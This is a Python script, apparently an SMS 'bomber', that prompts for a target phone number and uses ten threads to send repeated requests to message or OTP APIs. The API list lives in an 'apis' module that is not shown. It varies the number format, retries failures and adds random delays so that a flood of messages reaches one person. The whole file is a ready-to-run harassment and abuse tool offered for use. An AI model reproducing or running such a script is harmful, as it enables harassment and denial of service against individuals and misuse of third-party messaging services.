# bomber.py

import requests
import threading
import random
import time
from apis import APIS

# User Settings
TARGET_NUMBER = input("Enter target number (without +88): ").strip()
TOTAL_BOMBS = int(input("How many messages to send?: "))
USE_THREADS = True  # Enable multithreading
THREADS_COUNT = 10  # Set number of threads to 10
MIN_DELAY = 0.5
MAX_DELAY = 2.0
MAX_RETRIES = 3

# Format number randomly
def randomize_number(number):
    formats = [
        f"+88{number}",
        f"88{number}",
        f"0{number[-10:]}",
    ]
    return random.choice(formats)

# Single bombing task
def send_bomb(api, number):
    url = api["url"]
    method = api["method"].upper()
    retries = 0

    while retries <= MAX_RETRIES:
        try:
            num = randomize_number(number)
            if method == "POST":
                data = {k: v.format(number=num) for k, v in api.get("data", {}).items()}
                r = requests.post(url, data=data, timeout=10)
            elif method == "GET":
                params = {k: v.format(number=num) for k, v in api.get("params", {}).items()}
                r = requests.get(url, params=params, timeout=10)
            else:
                print(f"[x] Unknown method {method} for {api['name']}")
                return False

            if r.status_code == 200:
                print(f"[+] Success ({api['name']}) -> {num}")
                return True
            else:
                print(f"[-] Failed ({api['name']}) -> Status {r.status_code}")
                retries += 1
                time.sleep(1)
        except Exception as e:
            print(f"[-] Error ({api['name']}): {e}")
            retries += 1
            time.sleep(1)
    return False

# Main bombing logic
def bomber_worker():
    sent = 0
    while sent < TOTAL_BOMBS:
        api = random.choice(APIS)
        success = send_bomb(api, TARGET_NUMBER)
        if success:
            sent += 1
        time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))

def start_bombing():
    threads = []
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=bomber_worker)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    start_bombing()
